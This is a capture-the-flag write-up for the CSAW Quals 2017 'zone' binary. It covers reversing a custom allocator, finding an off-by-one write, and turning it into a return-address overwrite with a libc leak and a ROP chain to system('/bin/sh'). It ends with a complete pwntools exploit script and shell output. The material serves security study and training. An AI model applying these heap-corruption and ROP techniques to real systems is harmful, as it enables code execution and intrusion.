# Csaw Quals 2017 Zone

This writeup is based off of this other writeup:
https://amritabi0s.wordpress.com/2017/09/18/csaw-quals-2017-zone-writeup/

So we can see that we are given a 64 bit elf. When we run the elf, it gives us five options:


*	Allocate a new block
*	Delete a block
*	Write to the last block allocated
*	Print the last block
*	Exit the program

With that, let's start reversing the program.

## Reversing

One thing I should say, this elf is a bit of a pain to reverse. As a result I did a lot of reversing by seeing how the memory was laid out when various operations occurred with it.

#### Memory Layout

So when we start reversing out this program, we notice that it requests memory with `mmap`, then allocates it with custom function. This happens within a subfunction, in a subfunction called by `envSetup` which is called pretty soon a fter the stack canary is established:

```
  stackCanary = *MK_FP(__FS__, 40LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  envSetup((__int64)&enviornment);
  printf("Environment setup: %p\n", &enviornment);
```

when we check where the function `mmap` is called (I did it using IDA xreferences) we see that it is only called in a function, which is only called withing `envSetup`. We can see that it allocates a `0x1000` byte chunk. It is called four times, so we are left with `0x1000` byte chunks. The blocks allocated from the menu in the program come from those four chunks.

The next important piece of the memory we need to know, is each of those four different blocks are divided amongst four different size of blocks individually. The four different size of blocks allocated from the larger `0x1000` chunks are:

*	64 bits (0x40)
*	128 bits (0x80)
*	256 bits (0x100)
*	512 bits (0x200)

Now each of those four `0x1000` only has one type of those smaller chunks in it. There are a couple of things supporting this that support our belief in this. The first is that when we just run the elf in gdb, allocate one of each of the smaller chunks, store a string in it, then search for the corresponding string to see where the chunk is, we see that they are each stored in a different chunk of memory.

64 (0x40) bit chunk with string `15935728`
```
gdb-peda$ x/4g 0x7ffff7ff6000
0x7ffff7ff6000:	0x0000000000000040	0x0000000000000000
0x7ffff7ff6010:	0x3832373533393531	0x0000000000000000
```

128 (0x80) bit chunk with string `35715928`:
```
gdb-peda$ x/4g 0x7ffff7ff5000
0x7ffff7ff5000:	0x0000000000000080	0x0000000000000000
0x7ffff7ff5010:	0x3832393531373533	0x0000000000000000
```

256 (0x100) bit chunk with string `75395128`:
```
gdb-peda$ x/4g 0x7ffff7ff4000
0x7ffff7ff4000:	0x0000000000000100	0x0000000000000000
0x7ffff7ff4010:	0x3832313539333537	0x0000000000000000
```

512 (0x200) bit chunk with string `95135728`:
```
gdb-peda$ x/4g 0x7ffff7ff3000
0x7ffff7ff3000:	0x0000000000000200	0x0000000000000000
0x7ffff7ff3010:	0x3832373533313539	0x0000000000000000
```

and when we look at the layout of the various memory regions in gdb with the `vmmap` command, we can see that they all lie within a different chunk of memory, all four of which are `0x1000` bytes large:

```
0x00007ffff7ff3000 0x00007ffff7ff4000 rw-s	/dev/zero (deleted)
0x00007ffff7ff4000 0x00007ffff7ff5000 rw-s	/dev/zero (deleted)
0x00007ffff7ff5000 0x00007ffff7ff6000 rw-s	/dev/zero (deleted)
0x00007ffff7ff6000 0x00007ffff7ff7000 rw-s	/dev/zero (deleted)
```

Also another interesting piece that we see here, is that the chunks all have 16 byte headers. The first 8 bytes store the size of the chunk. The second eight bytes stores the address of the next free chunk, however only if the chunk isn't allocated. If we take a look at some of the space designated for smaller chunks, but hasn't been allocated we see that the chunk headers are already made:

```
gdb-peda$ x/40g 0x00007ffff7ff6000
0x7ffff7ff6000:	0x0000000000000040	0x00007ffff7ff6050
0x7ffff7ff6010:	0x0000000000000000	0x0000000000000000
0x7ffff7ff6020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff6030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff6040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff6050:	0x0000000000000040	0x00007ffff7ff60a0
0x7ffff7ff6060:	0x0000000000000000	0x0000000000000000
0x7ffff7ff6070:	0x0000000000000000	0x0000000000000000
0x7ffff7ff6080:	0x0000000000000000	0x0000000000000000
0x7ffff7ff6090:	0x0000000000000000	0x0000000000000000
0x7ffff7ff60a0:	0x0000000000000040	0x00007ffff7ff60f0
0x7ffff7ff60b0:	0x0000000000000000	0x0000000000000000
0x7ffff7ff60c0:	0x0000000000000000	0x0000000000000000
0x7ffff7ff60d0:	0x0000000000000000	0x0000000000000000
0x7ffff7ff60e0:	0x0000000000000000	0x0000000000000000
0x7ffff7ff60f0:	0x0000000000000040	0x00007ffff7ff6140
```

So we can see here that after it requests the `0x1000` byte chunks, it then splits them up and adds them to a free list which has the corresponding size plus 16 bytes (first eight bytes contains the size of the chunk, the second eight bytes contains a pointer to the next free block). When a block is allocated, it is removed from the free list and the ptr to the next free block is removed. So this is what the layout of a chunk looks like:

*	8 bytes: size of block
*	8 bytes: address of next free block (if this block has been allocated, just `0x0`)
*	x bytes: data of the chunk

Also one more thing, the reason why I originally though that the block sizes were that big, was in the main function, in the code that executes when we allocate a new chunk size, we can see that the number we input are ran through the following checks:

```
int __fastcall sub_4042F8(__int64 a1, unsigned __int64 a2)
{
  int result; // eax@2

  if ( a2 > 0x40 )
  {
    if ( a2 > 0x80 )
    {
      if ( a2 > 0x100 )
      {
        if ( a2 > 0x200 )
          result = 0;
        else
          result = allocat512chunk(a1);
      }
      else
      {
        result = allocate256chunk(a1);
      }
    }
    else
    {
      result = allocate128chunk(a1);
    }
  }
  else
  {
    result = allocate64chunk(a1);
  }
  return result;
}
```

#### Writing to a block

Now that we know the layout of the memory, let's try and look for a bug. Just from past ctf expeirences there is a good chance it will be in the writing function. Let's just try to overflow a chunk by inputting `80` bytes of data into a `64` byte space, then look at the memory in gdb afterwards:

first launch the program in gdb and give the input:
```
gdb-peda$ r
Starting program: /Hackery/csaw17/pwn/zone/zone 
Environment setup: 0x7fffffffde10
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
1
64
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
3
00000000000000000000000000000000000000000000000000000000000000000000000000000000
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
^C
Program received signal SIGINT, Interrupt.
```

next look at the memory:

```
Stopped reason: SIGINT
0x00007ffff756c260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
gdb-peda$ find 0000000000000000000000000000000000000000
Searching for '0000000000000000000000000000000000000000' in: None ranges
Found 1 results, display max 1 items:
zero (deleted) : 0x7ffff7ff6010 ('0' <repeats 65 times>)
gdb-peda$ x/x 0x7ffff7ff6010
0x7ffff7ff6010:	0x30
gdb-peda$ x/2g 0x7ffff7ff6000
0x7ffff7ff6000:	0x0000000000000040	0x0000000000000000
gdb-peda$ x/14g 0x7ffff7ff6000
0x7ffff7ff6000:	0x0000000000000040	0x0000000000000000
0x7ffff7ff6010:	0x3030303030303030	0x3030303030303030
0x7ffff7ff6020:	0x3030303030303030	0x3030303030303030
0x7ffff7ff6030:	0x3030303030303030	0x3030303030303030
0x7ffff7ff6040:	0x3030303030303030	0x3030303030303030
0x7ffff7ff6050:	0x0000000000000030	0x00007ffff7ff60a0
0x7ffff7ff6060:	0x0000000000000000	0x0000000000000000
```

So we can see here there is a 1 byte overflow (a byte that we can control). We can see that we overflowed the least signifcant byte of the size value in the header of the next free block. The value stored at `0x7ffff7ff6050` should be equal to `0x40` (the size of the blocks in this region) however we overflowed it to `0x30` (which is the hex reprenetation of the ASCII string `0`). So we see here, we have a one byte overflow. And when we look at the code for the third option (the option that allows us to write to the last chunk) we can see the bug:

```
          for ( i = 0LL; i <= v19; ++i )
          {
            v3 = &buf;
            v4 = 0LL;
            HIDWORD(v17) = read(0, &buf, 1uLL);
            if ( HIDWORD(v17) == 0xFFFFFFFF )
              exit(0xFFFFFFFF);
            if ( buf == 10 )
              break;
            *s++ = buf;
          }
```

here is the for loop which scans in a byte of data with `read` for each iteration. It runs the amount of times equivalent to `v19 + 1` because of the `<=` operator. The thing is `v19` is equal to the size of the chunk, so we can use this code to get a single byte overflow.

## Exploitation

#### Making the fake block

Now that we have a bug, we can exploit it. Now I  didn't completely reverse out how this program allocates / frees smaller blocks, I forgoed the hard reversing in place of just trying a couple of different things untill I figured out what I needed to (for me, it was a bit more time effecient).

With the one byte overflow we can overwrite the size value of a header with a single byte. What we can do is overflow one of the `64` (`0x40`) header sizes with the value `128` (`0x80`). Then we will allocate another `64` bit chunk, which will cause that chunk which it's header we overwrote to be allocated. We will then delete that chunk. This will cause the free chunk to go back into the free list. Hoever since we overwrote the size to be `128` (`0x80`) instead of `64` (`0x40`) it will enter the free list with chunk sizes `128` instead of the one with chunk sizes `64`, but will still maintain it's position in the `64` byte free list. This way when we allocate a `128` byte chunk after doing that, we will get the `64` byte chunk with the header we overwrote with `0x80`, and be able to write `0x80` bytes to it.

This will allow us to overflow the next chunk with `0x40` bytes, which will allow us to overwrite the entire header of the next chunk. This is beneficial since it will allow us to overwrite the pointer to the next free chunk. As a result when we allocate the chunk with the overwritten pointer, then allocate another chunk of the same size, we will get a chunk to an address to whatever address we overwrote it with (keep in mind, the first 16 bytes of that chunk will be used for the header). 

Also when we run the program, we get an infoleak:

```
$	./zone
Starting program: /Hackery/csaw17/pwn/zone/zone 
Environment setup: 0x7fffffffde10
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
```

that infoleak that we got there is from the stack. It is specifically at `rbp-0x80`. The return address is stored at `rbp+0x8`. This means that there is a `0x88` byte difference between the infoleak we go, and since there is `0x10` (16) bytes for the header we have to account for, if we overwrite the next free chunk pointer with the stack leak + `0x78`, the next chunk of size `64` bytes's data section will start where the return address is.

Now if we overwrite the next free block pointer of the next block with that address (taking into account the size of the header), then allocate it, the program will think the next free block is where `16` bytes before the return address. Now if were to allocate another block of the same size, we would get a block which it's content section directly overlaps with the return address.

#### Calling System

Now that we have a block that we can write to, who's data section directly overlaps with the return address we are close to getting remote code execution. One way we could do it is just calling the libc function `system` with the argument `/bin/sh` which would give us a shell. The issue with doing this is that that function and string aren't hard coded into the binary, so we will need a libc infoleak in order to break ASLR in the region of memory where those things are stored (libc). 

Luckily for us, the contents of the last allocated block can be printed using the fourth menu option. The last allocated block's contents directly overlap with the return address. The return address is a libc address. SO just by printing the last allocated block, we can get the infoleak that we need.

Here we can see the address of the infoleak that we got, along with the addresses of the libc `system` function, and the libc string `/bin/sh` (which we can use to calculate the corresponding offsets which we will need for our exploit):

```
gdb-peda$ x/x 0x7fb960e41830
0x7fb960e41830 <__libc_start_main+240>:	0x31000197f9e8c789
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x7fb960e66390 <__libc_system>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7fb960fadd57 --> 0x68732f6e69622f ('/bin/sh')
```

The last piece to this which we will need is a ROP gadget. The `system` function takes a char pointer as an argument, which it will expect in the `rdi` register. We need a rop gadget which will just pop a value off of the stack into the `rdi` register, then return to system. Using ROPgadget, this is fairly easy:


```
$	ROPgadget --binary zone | grep pop | grep rdi
0x0000000000403cac : lcall ptr [rdi] ; pop rbp ; ret
0x00000000004026e8 : mov ebp, esp ; mov qword ptr [rbp - 8], rdi ; nop ; pop rbp ; ret
0x00000000004012f2 : mov qword ptr [rbp - 8], rdi ; mov rax, qword ptr [rbp - 8] ; pop rbp ; ret
0x00000000004026ea : mov qword ptr [rbp - 8], rdi ; nop ; pop rbp ; ret
0x00000000004026e7 : mov rbp, rsp ; mov qword ptr [rbp - 8], rdi ; nop ; pop rbp ; ret
0x0000000000404653 : pop rdi ; ret
```

And we can see at `0x404653` is the rop gadget we will need. With that, we have all of the pieces we need to land this bug.

## review / tl;dr

So in review, this is what we are doing to get rce:

*	Allocate a `64` byte chunk
*	Overflow the previous chunk with 65 bytes of data to overflow the next chunks size value with `0x80`
*	Allocate another `64` byte chunk, then free it. This will allocate the previously overflowed chunked (the one which size value we overwrote to `0x80`) and then delete it, adding it to the free list of size `0x80`
*	Allocate a `0x80` byte chunk. This will give us the `64` byte chunk we previously allocated then deleted, however it will allow us to write `0x80` btyes of data to it:
*	Use the newly allocated block to overwrite the next free pointer with the stack leak + `0x78`
*	Allocate two more chunks, which will give us a chunk that points to the return address
*	Print the contents of the last allocated chunk to get a libc infoleak
*	Write rop gadget + address of binsh + address of system
*	Exit to trigger return, which will execute our code, which will pop a shell

## Exploit

Here is the code for the exploit:

```
# Import pwntools
from pwn import *

# Establish the target process
target = process('./zone')
#gdb.attach(target)

# pop rdi ; ret 
gadget = 0x404653

# Establish the offsets to binsh, system, and the rop gadget we need
binsh = 0x16c527
system = 0x24b60


# Establish the functions to interact with the program
def alloc(size):
	target.recvuntil('5) Exit\n')
	target.sendline('1')
	target.sendline(str(size))

def delete():
	target.recvuntil('5) Exit\n')
	target.sendline("2")

def write(data):
	target.recvuntil('5) Exit\n')
	target.sendline("3")
	target.sendline(data)

def printb():
	target.recvuntil('5) Exit\n')
	target.sendline("4")

def ret():
	target.sendline("5")

# Get the stack infoleak, and filter it out. Also calculate the address for the fake block.
leak = target.recvline()
leak = leak.replace("Environment setup: ", "")
leak = int(leak, 16)
fakeBlock = leak + 0x78
log.info("Stack leak is: " + hex(leak))
log.info("Fake Block address is: " + hex(fakeBlock))

# Allocate the first block, and overwrite the size value of the next block with 0x80
alloc(64)
write("\x80"*65)

# Allocate the block with the overwritten size value, then free it
alloc(64)
delete()

# Allocate the block we just freed, since it was added to the free list of size 0x80
alloc(128)

# Overwrite the next free block pointer of the next chunk to point to the return address
payload = "0"*0x40 + p64(0x40) + p64(fakeBlock)  
write(payload)

# Allocate two more chunks to get a block that points to the return address we can write to
alloc(64)
alloc(64)

# Print the contents of the return address for an infoleak, and filter it out
printb()
libcLeak = target.recvline()
libcLeak = libcLeak.replace("\x0a", "")
libcLeak = u64(libcLeak + "\x00"*2)
log.info("Libc infoleak: " + hex(libcLeak))

# Form the payload to get rce, and write it
payload = p64(gadget) + p64(libcLeak + binsh) + p64(libcLeak + system)
write(payload) 

# Exit the function to execute our payload
ret()

# Drop to an interactive shell to use the shell
log.info("Enjoy your slay XD. I might listen to Ice Nine Kills a bit too much")
target.interactive()
```

and when we run the exploit:

```
$	python exploit.py 
[+] Starting local process './zone': pid 20348
[*] Stack leak is: 0x7ffce364a8a0
[*] Fake Block address is: 0x7ffce364a918
[*] Libc infoleak: 0x7effd9ebe830
[*] Enjoy your slay XD. I might listen to Ice Nine Kills a bit too much
[*] Switching to interactive mode
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
$ w
 18:37:47 up  7:51,  1 user,  load average: 0.44, 0.33, 0.41
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guy      tty7     :0               10:47    7:50m  9:59   0.25s /sbin/upstart --user
$ ls
core        peda-session-dash.txt      peda-session-zone.txt  zone
exploit.py  peda-session-ls.txt        readme.md
payload     peda-session-w.procps.txt  solved.py
```

Just like that, we popped a shell!